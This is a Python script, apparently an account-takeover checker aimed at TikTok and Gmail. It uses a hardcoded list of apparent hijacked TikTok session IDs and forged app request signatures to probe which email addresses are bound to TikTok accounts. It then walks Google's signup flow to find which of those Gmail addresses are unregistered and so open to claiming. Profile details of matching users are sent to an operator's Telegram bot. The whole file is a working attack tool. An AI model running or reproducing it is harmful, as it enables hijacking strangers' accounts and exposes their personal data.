import os
import random
import string
import threading
import time
import uuid
import re
import json
import binascii
from concurrent.futures import ThreadPoolExecutor
from random import choice, randrange
from uuid import uuid4
import secrets
from urllib.parse import urlencode

import requests
from hsopyt import Argus, Gorgon, Ladon, md5

hit, bt, karbo1, be, ge = 0, 0, 0, 0, 0
from colorama import Fore, Style, init

# تفعيل الألوان على ويندوز
init(autoreset=True)

BOLD = Style.BRIGHT

iid = input(f"{BOLD}{Fore.CYAN}- ENTER YOUR ID : ")
tok = input(f"{BOLD}{Fore.GREEN}- ENTER YOUR TOKEN : ")

print(f"\n{BOLD}{Fore.RED}ID : {iid}")
print(f"{BOLD}{Fore.RED}TOKEN : {tok}")
def admin_gmail(name):
    try:
        file = open(name, 'r').read().splitlines()
    except:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("\033[1;91mFILE NOT FOUND\033[0m")
        return
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(req, user + "@gmail.com") for user in file]
        for future in futures:
            future.result()

def random_string(lenkarbo1h):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=lenkarbo1h))

def main():
    os.system("cls" if os.name == "nt" else "clear")
    

    
    try:
        name = input("\033[1;96m- ENTER FILE NAME : \033[0m")
        admin_gmail(name)
    except Exception as e:
        print("Error Code : 5101")

def get_user_id(username):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
    }
    try:
        tikinfo = requests.get(f'https://www.tiktok.com/@{username}', headers=headers).text
        info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommenUserList"')[0]
        user_id = str(info.split('id":"')[1]).split('",')[0]
        return user_id
    except:
        return None

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
    if not unix: unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform = platform, aid = aid, license_id = license_id, sec_device_id = sec_device_id, sdk_version = sdk_version_str, sdk_version_int = sdk_version)
    }

def get_level(username):
    try:
        user_id = get_user_id(username)
        if not user_id:
            return "N/A"
        
        url = "https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?" + urlencode({
            "request_from": "profile_card_v2",
            "request_from_scene": "1",
            "target_uid": str(user_id),
            "iid": str(random.randint(1, 10 ** 19)),
            "device_id": str(random.randint(1, 10 ** 19)),
            "ac": "wifi",
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "300102",
            "version_name": "30.1.2",
            "device_platform": "android",
            "os": "android",
            "ab_version": "30.1.2",
            "ssmix": "a",
            "device_type": "RMX3511",
            "device_brand": "realme",
            "language": "ar",
            "os_api": "33",
            "os_version": "13",
            "openudid": str(binascii.hexlify(os.urandom(8)).decode()),
            "manifest_version_code": "2023001020",
            "resolution": "1080*2236",
            "dpi": "360",
            "update_version_code": "2023001020",
            "_rticket": str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
            "current_region": "IQ",
            "app_type": "normal",
            "sys_region": "IQ",
            "mcc_mnc": "41805",
            "timezone_name": "Asia/Baghdad",
            "carrier_region_v2": "418",
            "residence": "IQ",
            "app_language": "ar",
            "carrier_region": "IQ",
            "ac2": "wifi",
            "uoo": "0",
            "op_region": "IQ",
            "timezone_offset": "10800",
            "build_number": "30.1.2",
            "host_abi": "arm64-v8a",
            "locale": "ar",
            "region": "IQ",
            "content_language": "gu,",
            "ts": str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
            "cdid": str(uuid.uuid4()),
            "webcast_sdk_version": "2920",
            "webcast_language": "ar",
            "webcast_locale": "ar_IQ"
        })
        
        headers = {
            'User-Agent': "com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)"
        }
        
        url_params = url.split('?')[1]
        headers.update(sign(url_params, '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233))
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            level_match = re.search(r'"default_pattern":"(.*?)"', response.text)
            if level_match:
                level_text = level_match.group(1)
                if 'المستوى رقم' in level_text:
                    return level_text.split('المستوى رقم')[1].strip()
                else:
                    return "N/A"
        return "N/A"
    except Exception as e:
        return "N/A"


def info(email):
    global hit, iid, tok
    hit += 1
    username = email.split('@')[0]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        url = f"https://www.tiktok.com/@{username}"
        response = requests.get(url, headers=headers, timeout=15)
        html = response.text


        level = get_level(username)


        m = re.search(r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__".*?>(.*?)</script>', html)
        if not m:
            ff = f"""
[ • ] Username : {username}
[ • ] Email    : {email}
[ • ] Note     : No detailed info found
            """
            print(ff)
            try:
                requests.post(f"https://api.telegram.org/bot{tok}/sendMessage", params={'chat_id': iid, 'text': ff})
            except:
                pass
            return

        data_json = json.loads(m.group(1))
        iinfo = data_json['__DEFAULT_SCOPE__']['webapp.user-detail']['userInfo']
        user_obj = iinfo['user']
        stats = iinfo['stats']

        follower_count = format(stats.get('followerCount', 0), ',d')
        following_count = format(stats.get('followingCount', 0), ',d')
        heart_count = format(stats.get('heartCount', 0), ',d')
        video_count = format(stats.get('videoCount', 0), ',d')

        ff = f"""
-  -  -  -  -  -  -  -  -  -  -  -  -
[ • ] Name  : {user_obj.get("nickname", "N/A")}
[ • ] Username : @{user_obj.get("uniqueId", username)}
[ • ] Email : {email}@gmail.com
[ • ] Followers : {follower_count}
[ • ] Following : {following_count}
[ • ] Likes : {heart_count}
[ • ] Bio : {user_obj.get("signature", "N/A")}
[ • ] Level : {level}
-  -  -  -  -  -  -  -  -  -  -  -  - 
[ • ] User ID : {user_obj.get("id", "N/A")}
[ • ] Videos : {video_count}
[ • ] Account Type  : {"Private" if user_obj.get("privateAccount") else "Public"}
[ • ] Verified : {"yes" if user_obj.get("verified") else "No"}
[ • ] Profile Link  : https://www.tiktok.com/@{user_obj.get("uniqueId", username)}
-  -  -  -  -  -  -  -  -  -  -  -  - 
Done by the developer - @v77v6
        """
        print(ff)
        try:
            requests.post(f"https://api.telegram.org/bot{tok}/sendMessage", params={'chat_id': iid, 'text': ff})
        except:
            pass
    
    except Exception as e:
        ff = f"""
[ • ] Username : {username}
[ • ] Email    : {email}
[ • ] Done by the developer - @v77v6
        """
        print(ff)
        try:
            requests.post(f"https://api.telegram.org/bot{tok}/sendMessage", params={'chat_id': iid, 'text': ff})
        except:
            pass


def Gmail(email):
    global hit, bt, karbo1, be, ge
    
    if '@' in email:
        email = email.split('@')[0]
    
    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
        return False
    
    name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5, 10)))
    birthday = random.randrange(1980, 2010), random.randrange(1, 12), random.randrange(1, 28)
    
    s = requests.Session()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-browser-channel': 'stable',
        'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
        'x-browser-year': '2024',
    }

    params = {
        'biz': 'false',
        'continue': 'https://mail.google.com/mail/u/0/',
        'ddm': '1',
        'emr': '1',
        'flowEntry': 'SignUp',
        'flowName': 'GlifWebSignIn',
        'followup': 'https://mail.google.com/mail/u/0/',
        'osid': '1',
        'service': 'mail',
    }

    response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
    tl = response.url.split('TL=')[1]
    s1 = response.text.split('"Qzxixc":"')[1].split('"')[0]
    at = response.text.split('"SNlM0e":"')[1].split('"')[0]

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name, at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUkarbo1ewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqkarbo1avCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDkarbo1ESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOkarbo1T68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0], birthday[1], birthday[2], at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'NHJMOd',
        'source-path': '/lifecycle/steps/signup/username',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email, at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text

    if "password" in response:
        info(email)
        os.system('cls' if os.name == "nt" else "clear")
        ge += 1
        display_stats()
    else:
        os.system('cls' if os.name == "nt" else "clear")
        be += 1
        display_stats()

def sign(params: str, payload: str or None = None, sec_device_id: str = '', cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = 'v05.00.06-ov-android', sdk_version: int = 167775296, platform: int = 0, unix: float = None):
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        if not unix: unix = time.time()

        return Gorgon(params, unix, payload, cookie).get_value() | {
            'content-lenkarbo1h' : str(len(payload)),
            'x-ss-stub'      : x_ss_stub.upper(),
            'x-ladon'        : Ladon.encrypt(int(unix), license_id, aid),
            'x-argus'        : Argus.get_sign(params, x_ss_stub, int(unix),
                platform        = platform,
                aid             = aid,
                license_id      = license_id,
                sec_device_id   = sec_device_id,
                sdk_version     = sdk_version_str, 
                sdk_version_int = sdk_version
            )}

def req(email):
    global hit, bt, karbo1, be, ge    
    try:
     	sess=random.choice([
    "a6fa35d0f992811f5226b957a7df9727",
    "686ed6ce7442dd7283421250a8560971",
    "8a0f805b4ffaed72f1d8baeb5011c862",
    "fafeea423aab4765588cca408d734e80",
    "1942d5a4ee45f83694211a3caffa45fa",
    "5b3b7538f89d2115ac2dc405c9a9bb31",
    "2a2cdc1f66a0498f79ac00ae35ab8c79",
    "287427a2257b70959ca2eaddc2ed93d7",
    "68fe5cb10014acb91b8b736040f15ecc",
    "f85cde338cc29a9f422fd65597e881e3",
    "7b09cdd1f2fdc2956999aad5e7cf1d5d",
    "fe970bf6e7bd91a72bf6bbce7e4290e5",
    "53df826d423e24616e720f4876bb5caa",
    "5929a192c3372c966302a87ff6844b16",
    "aa04acd6be5212dfb5359d917bc400bb",
    "3e95a8f74f9ab758c1da6133ac8e2e35",
    "766be2c21fbe7ac435b0ce427ad8d411",
    "b9a1abec083377c00257c871ad364c1a",
    "ee504e276daa005328e6c100cef59839",
    "fb69699f8e4891deb3e19d864e993579",
    "f7ea313c98cd0efcc177ff7e30bda3ed",
    "555bdb5260fb01f52f66116ed01ac833",
    "a05bff747a5d33bb7522a39d55dfc1b0",
    "fe39b9d0ca36fa71ef016d1511c94554",
    "e24e4726719c1b98863378ebb751c900",
    "8cf70901190dc59a4556f5015a48ba71",
    "925c10391beac5ba82b9c8f103d94962",
    "599b433928c6353ddc9c34af94a89a3a",
    "54c006fbfb10b468bf5ecace66695a12",
    "d05154e0ce203af5551e09e75d415c60",
    "090d5a4d8e968c1eb19058d41c21fa14",
    "8f18307332e7eedc10facf55d0f1ab60",
    "5c030adff603870d25c4c02aaa8d9a7d",
    "206a24eac5d75fbe6d52f96296a30236",
    "f799f3d7ae293b84f0079d427bb4a7dd",
    "742c509776b1785555318fdad684a2fe",
    "2a9935df5ae4f43dd45f42d7bfa71ddf",
    "16d8fa69b99cacb286d13e4309cb49b3",
    "4665283a2045e1ef358d7d020cf1bd0d",
    "ce5f8a512e09518323f5a484d477f4a6",
    "dc83b5f61f10ad3eb38331c29478eb72",
    "017136b22bea42c780024b685eb7347f",
    "583f95cad8b102478df230d168861b2e",
    "8f4aed61cf645b5b0fece8a2e281cf4e",
    "1fee85132d973f9f05e9ffa23a77b57e",
    "776e13efcf40e5a8dd8accf06b16c4c2",
    "8fc9e22a616502d344c9536389d019e7",
    "3068bfe245d62a8825c4a7790747dec3",
    "f46ceb6e6654e4deb353118a563f79bd",
    "7f99ac8a094b136ae936b9f871f0d9b5",
    "375626d3a835321bbc113959cf4c4775",
    "733ae2a38a29e81e4a2912e61ebe43eb",
    "953c9cdc78ae417b466e76cfce9b06d8",
    "47946c7e69530db095791f788ce7f259",
    "65e3f9d5495b2652fb8a97adcda74529",
    "0bbdaf2c6a0aed945d989f44576d312a",
    "440e4b9dd49a9728006616e6495ca142",
    "c55750767585b4fdbd4899b20f78e4e4",
    "5d57495e2228987ce69ea942ccca1a2f",
    "86a2d7dfd85e91d2018f693d4e79c1a9",
    "1304ed6041c4c1b33c945030ba18d331",
    "806f676c3c69a5377f8f583d31b6cf06",
    "68c076d160f8fe50a5346e33c0dd5632",
    "a5f71818abfb4444038d0122d2c91c52",
    "37fba24679398d8d9df16f58473d22e8",
    "a663298bc79811d602b5bd7e4c3a85a0",
    "66a441cba791d8d712eac00083105c10",
    "a50eabda965c7f698b4bb947a3050e90",
    "e87e25f4bafc66d0cbf1081281372962",
    "00b4e18d31bdf0e7e6af46b8320796cd",
    "0e070f34624c90607f57e58de66d1184",
    "3e3aca0d3801f8abe27213bb0f3eb157",
    "7937ce5856cb68e7bb2f1c2223485809",
    "38a67cf4c5686225de8e452b9f1b1d6c",
    "993cca385d4d77fdedca444847d04dc3",
    "b707553e5b1a67c5ed797fb74cdf1aa4",
    "fb39a8041c4c316d68b910f8dddbbde4",
    "0fd357097fc61d201ecc373c414464c1",
    "875ba73c6416811870cdd0b89f57a28b",
    "f733e3000b7cedcc75d3150f209d6df5",
    "bc6536f9699f973d0d235ea5ce31636f",
    "8f291d9ba63fd7f47b26105d8223abd2",
    "d8b6d129ca88055a2d5dc4699cd42778",
    "beb67fe614f57888320d6907c3ad1041",
    "7e160b30203ec293a42c867d185de5bd",
    "5723f6bb521ae3b12867edc9d5312d5f",
    "3f5ccd9ee82686103f2d91e9bf674885",
    "4ab65748b8d2d56738721da12036626b",
    "0859cb35396c9c9a5e44580fb92c6b5d",
    "21a20e37b49ff1d9859d5e5d087c028f",
    "9ff8a34153629df34c95faafb0932fec",
    "c7de0325d330dd32b50044fcacd58823",
    "bc9ae7dd2711f81536bc5aedf02c53a0",
    "a461404b70b263dd4a073548aa3bcc1d",
    "17a0df6d1acc759aea985107c52cd530",
    "3c61e0a946f4b688d43a7706a249b52e",
    "84f99ccfc4235afc3ac7a1a8fe818e62",
    "50ff4ce11a3f0478a1c9863c12d8a4d3",
    "1577379cba2a79d05fc82e6e20b34d49",
    "0282f01cf67443d6355c63ea29ee0558",
    "438403056065acca73fec1ea2e93e7d3",
    "028e705c49c1ab3602e6d154a9cd69c3"
])

     	
     	
     	url = "https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"     	     	  	    
     	params = {
		    "device_id": str(random.randint(1000000000000000000, 9999999999999999999)),
		    "passport-sdk-version": "19",
		    "ts": str(int(time.time())),
		    "_rticket": str(int(time.time() * 1000)),
		    "openudid": uuid.uuid4().hex[:16],
		    "os_version": str(random.choice([9, 10, 11, 12, 13])),
		    "os_api": str(random.randint(28, 34)),
		    "device_type": random.choice(["Infinix X6816", "SM-G960F", "Redmi Note 8", "NE2211", "JNY-LX1"]),
		    "device_brand": random.choice(["Infinix", "Samsung", "Xiaomi", "OnePlus", "Huawei"]),
		    "region": random.choice(["IQ", "SA", "AE", "EG", "US"]),
		    "app_language":"en", 
		    "language": "en",
		    "locale": "en",
		    "current_region": random.choice(["IQ", "SA", "AE", "EG", "US"]),
		    "ac": random.choice(["WIFI", "4G", "5G"]),
		    "ac2": random.choice(["wifi", "wifi5g", "mobile"]),
		    "aid": "1233",
		    "version_code": "310503",
		    "version_name": "31.5.3",
		    "device_platform": "android",
		    "app_name": "musical_ly",
		    "app_version": "31.5.3",
		    "os": "android",
		    "timezone_offset": "10800",
		    "timezone_name": "Asia/Baghdad",
		    "channel": "googleplay",
		}
	        
     	cookies = {"sessionid":sess}
     	payload = {"email": email}
     	x_log1 = sign(urlencode(params), urlencode(payload), "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
     	headers={
		"sdk-version":"2",
		"user-agent":"com.zhiliaoapp.musically/2021306050 (Linux; U; Android 13; ar; ANY-LX2; Build/HONORANY-L22CQ; Cronet/TTNetVersion:57844a4b 2019-10-16)",}
     	headers.update(x_log1)
     	res = requests.post(url,params=params,cookies=cookies,data=payload,headers=headers)
     	response_text = res.text
     	if "1023" in response_text:
     		Gmail(email)
     		os.system('cls' if os.name == 'nt' else 'clear')
     		karbo1 += 1
     		display_stats()     	       		
     	elif '1007' in response_text:
     		os.system('cls' if os.name == 'nt' else 'clear')
     		bt += 1
     		display_stats()
    
    except (ValueError,TypeError,KeyError,IndexError,FileNotFoundError,AttributeError,ZeroDivisionError,requests.exceptions.RequestException) as e:
    		print(e)

def display_stats():
    print(f"""
    \033[1;95m[ • ] HIT'S          : {hit}\033[0m                    
    \033[1;95m[ • ] TIKTOK GOOD    : {karbo1}\033[0m                     
    \033[1;95m[ • ] TIKTOK BAD     : {bt}\033[0m                     
    \033[1;95m[ • ] GMAIL GOOD     : {ge}\033[0m                     
    \033[1;95m[ • ] GMAIL BAD      : {be}\033[0m                     
""")

if __name__ == "__main__":
    main()
